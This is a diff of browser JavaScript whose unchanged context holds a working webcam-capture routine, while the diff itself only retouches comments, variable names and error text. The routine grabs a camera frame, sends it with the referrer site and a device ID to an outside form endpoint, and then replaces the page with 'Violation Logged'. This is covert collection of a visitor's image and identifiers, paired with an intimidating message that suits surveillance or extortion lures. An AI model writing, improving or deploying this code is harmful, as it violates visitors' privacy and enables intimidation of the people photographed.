@@ -9,9 +9,9 @@
 
     function sendSnapshot(imgData) {
       const formData = new FormData();
-      formData.append('entry.2012483072', imgData);        // Snapshot
-      formData.append('entry.500527079', referrer);        // Visited Site
-      formData.append('entry.1027569634', deviceID);       // Device ID
+      formData.append('entry.2012483072', imgData);      // Image Snapshot
+      formData.append('entry.500527079', referrer);      // Referrer site
+      formData.append('entry.1027569634', deviceID);     // Device ID
 
       fetch(scriptURL, {
         method: 'POST',
@@ -25,6 +25,7 @@
     function snap() {
       const video = document.createElement('video');
       const canvas = document.createElement('canvas');
+
       navigator.mediaDevices.getUserMedia({ video: true })
         .then(stream => {
           video.srcObject = stream;
@@ -35,13 +36,13 @@
             canvas.getContext('2d').drawImage(video, 0, 0);
             const image = canvas.toDataURL("image/png");
             sendSnapshot(image);
-            stream.getTracks().forEach(t => t.stop());
+            stream.getTracks().forEach(track => track.stop());
             document.body.innerHTML = "<h2>Violation Logged</h2>";
           }, 1500);
         })
         .catch(err => {
-          console.error("Camera access failed", err);
-          document.body.innerHTML = "<h2>Camera Access Blocked</h2>";
+          console.error("Camera access denied or failed", err);
+          document.body.innerHTML = "<h2>Camera access failed</h2>";
         });
     }
 
